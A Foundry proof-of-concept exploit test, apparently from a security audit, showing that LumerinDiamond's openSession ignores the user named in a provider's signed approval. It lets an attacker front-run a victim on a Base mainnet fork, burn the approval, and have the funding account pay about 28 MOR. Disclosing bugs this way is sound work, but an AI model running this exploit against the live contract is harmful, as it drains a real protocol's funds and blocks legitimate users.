// SPDX-License-Identifier: MIT
// T4-01 — LumerinDiamond: provider session approval is not bound to a user.
// A provider approval is abi.encode(bidId, chainId, user, timestamp) signed by
// the provider. The provider signs it for ONE specific user (see
// proxy-router InitiateSessionResponse / utils/provider-helper getProviderApproval).
// The contract decodes the approval in _extractProviderApproval but DISCARDS the
// user field, and never checks it against openSession's user_ argument — even
// though ISessionRouter declares error SessionApprovedForAnotherUser(), which is
// never used anywhere in the repo. Any observer of a victim's approval (mempool
// / on-chain openSession calldata) can front-run the victim, open the session
// as themselves, burn the single-use approval, and have the provider paid out
// of the funding account for the attacker's session.
//
// PoC (Base mainnet fork, block 58427268, diamond 0x6aBE...3030a):
//   provider signs an approval for VICTIM; ATTACKER opens a session with it;
//   victim's own openSession then reverts SessionDuplicateApproval; attacker
//   closes after max duration and the funding account pays the provider 28 MOR
//   (~$19.60 @ $0.70) for a session the provider never authorized for the
//   attacker, while the attacker recovers ~all of their own stake.
//
// Run:  BASE_RPC_URL=https://mainnet.base.org forge test --match-contract T401ApprovalHijack -vvv
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface ILumerinDiamond {
    struct Session {
        address user;
        bytes32 bidId;
        uint256 stake;
        bytes closeoutReceipt;
        uint256 closeoutType;
        uint256 providerWithdrawnAmount;
        uint128 openedAt;
        uint128 endsAt;
        uint128 closedAt;
        bool isActive;
        bool isDirectPaymentFromUser;
    }

    function providerRegister(address provider_, uint256 amount_, string calldata endpoint_) external;
    function modelRegister(
        address modelOwner_,
        bytes32 baseModelId_,
        bytes32 ipfsCID_,
        uint256 fee_,
        uint256 amount_,
        string calldata name_,
        string[] memory tags_
    ) external;
    function postModelBid(address provider_, bytes32 modelId_, uint256 pricePerSecond_) external returns (bytes32);
    function getModelId(address account_, bytes32 baseModelId_) external pure returns (bytes32);
    function getBidId(address provider_, bytes32 modelId_, uint256 nonce_) external pure returns (bytes32);
    function openSession(
        address user_,
        uint256 amount_,
        bool isDirectPaymentFromUser_,
        bytes calldata approvalEncoded_,
        bytes calldata signature_
    ) external returns (bytes32);
    function getSession(bytes32 sessionId_) external view returns (Session memory);
    function getIsProviderApprovalUsed(bytes memory approval_) external view returns (bool);
    function closeSession(bytes calldata receiptEncoded_, bytes calldata signature_) external;
    function withdrawUserStakes(address user_, uint8 iterations_) external;
    function getFundingAccount() external view returns (address);
    function getMaxSessionDuration() external view returns (uint128);
}

contract T401ApprovalHijack is Test {
    error SessionDuplicateApproval();

    address constant DIAMOND = 0x6aBE1d282f72B474E54527D93b979A4f64d3030a;
    address constant MOR = 0x7431aDa8a591C955a994a21710752EF9b882b8e3;
    uint256 constant FORK_BLOCK = 58427268;
    uint256 constant CHAIN_ID = 8453;
    // Live bid price observed on Base at the fork block (provider 0xB399E0...):
    // 46296296296296 wei/s == 28 MOR per 7-day max session.
    uint256 constant PPS = 46296296296296;

    uint256 providerPk = 0xA11CE;
    uint256 attackerPk = 0xB0B;
    address provider;
    address attacker;
    address victim;

    ILumerinDiamond diamond;
    IERC20 mor;

    bytes32 bidId;
    bytes32 modelId;

    function setUp() public {
        vm.createSelectFork(vm.envOr("BASE_RPC_URL", string("https://mainnet.base.org")), FORK_BLOCK);
        provider = vm.addr(providerPk);
        attacker = vm.addr(attackerPk);
        victim = makeAddr("victim");
        diamond = ILumerinDiamond(DIAMOND);
        mor = IERC20(MOR);

        // Fund the three unprivileged actors with MOR (simulates owning MOR).
        deal(MOR, provider, 500 ether);
        deal(MOR, attacker, 20000 ether);
        deal(MOR, victim, 20000 ether);

        vm.prank(provider);
        mor.approve(DIAMOND, type(uint256).max);
        vm.prank(attacker);
        mor.approve(DIAMOND, type(uint256).max);
        vm.prank(victim);
        mor.approve(DIAMOND, type(uint256).max);

        // Provider registers (100 MOR stake), registers a model (100 MOR stake),
        // posts a bid at the live-observed price. All permissionless, unprivileged.
        vm.prank(provider);
        diamond.providerRegister(provider, 100 ether, "https://provider.example:8082");
        bytes32 baseModelId = bytes32(uint256(1));
        vm.prank(provider);
        diamond.modelRegister(provider, baseModelId, bytes32("ipfs://test"), 0, 100 ether, "test", new string[](0));
        modelId = diamond.getModelId(provider, baseModelId);
        vm.prank(provider);
        diamond.postModelBid(provider, modelId, PPS);
        bidId = diamond.getBidId(provider, modelId, 0);
    }

    function _ethSign(uint256 pk, bytes memory payload) internal pure returns (bytes memory) {
        bytes32 digest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", keccak256(payload)));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, digest);
        return abi.encodePacked(r, s, v);
    }

    function testApprovalHijack() public {
        // 1. Provider signs an approval FOR THE VICTIM (as proxy-router does).
        bytes memory approval = abi.encode(bidId, CHAIN_ID, victim, uint128(block.timestamp));
        bytes memory approvalSig = _ethSign(providerPk, approval);
        (,, address approvedUser,) = abi.decode(approval, (bytes32, uint256, address, uint128));
        assertEq(approvedUser, victim, "approval names victim");

        // 2. ATTACKER front-runs the victim: opens a session as THEMSELVES
        //    with the victim's approval. Must succeed (this is the bug).
        uint256 attackerStake = 20000 ether;
        vm.prank(attacker);
        bytes32 sessionId = diamond.openSession(attacker, attackerStake, false, approval, approvalSig);

        ILumerinDiamond.Session memory s = diamond.getSession(sessionId);
        assertEq(s.user, attacker, "session belongs to attacker, not victim");
        assertTrue(diamond.getIsProviderApprovalUsed(approval), "approval burned");
        assertEq(uint256(s.endsAt) - uint256(s.openedAt), diamond.getMaxSessionDuration(), "capped at max duration");

        // 3. Victim's own openSession with the same approval now reverts.
        vm.expectRevert(SessionDuplicateApproval.selector);
        vm.prank(victim);
        diamond.openSession(victim, attackerStake, false, approval, approvalSig);

        // 4. Attacker runs the session to the end and closes it. The receipt
        //    is self-signed by the attacker (valid format, wrong signer) so
        //    the close lands as a "dispute"; closing late still pays the
        //    provider in full out of the funding account.
        address funding = diamond.getFundingAccount();
        uint256 fundingBefore = mor.balanceOf(funding);
        uint256 providerBefore = mor.balanceOf(provider);

        vm.warp(s.endsAt);
        bytes memory receipt = abi.encode(sessionId, CHAIN_ID, uint128(block.timestamp), uint32(5000), uint32(100));
        bytes memory receiptSig = _ethSign(attackerPk, receipt);
        vm.prank(attacker);
        diamond.closeSession(receipt, receiptSig);

        uint256 expectedPayout = uint256(s.endsAt - s.openedAt) * PPS; // ~28 MOR (7d at live pps)
        // 604800 * 46296296296296 == 27999999999999820800 wei (live pps is the
        // floor of 28 MOR / 604800s, so the payout is 179200 wei under 28 MOR).
        assertEq(expectedPayout, 27999999999999820800, "sanity: 7d at live pps");
        assertEq(mor.balanceOf(provider) - providerBefore, expectedPayout, "provider paid from funding account");
        assertEq(fundingBefore - mor.balanceOf(funding), expectedPayout, "funding account lost 28 MOR");

        // 5. Attacker recovers ~all of their own stake (only the day-locked
        //    portion was held, released the next day). Net cost to attacker:
        //    ~0 MOR + gas, for 28 MOR of provider service paid by the fund.
        vm.warp(block.timestamp + 2 days);
        vm.prank(attacker);
        diamond.withdrawUserStakes(attacker, 255);
        uint256 attackerFinal = mor.balanceOf(attacker);
        emit log_named_uint("attacker MOR recovered", attackerFinal);
        emit log_named_uint("funding MOR lost (wei)", expectedPayout);
        assertGe(attackerFinal, 19999 ether, "attacker recovered ~all stake");
        assertLe(attackerFinal, 20000 ether, "attacker did not gain stake");
    }
}
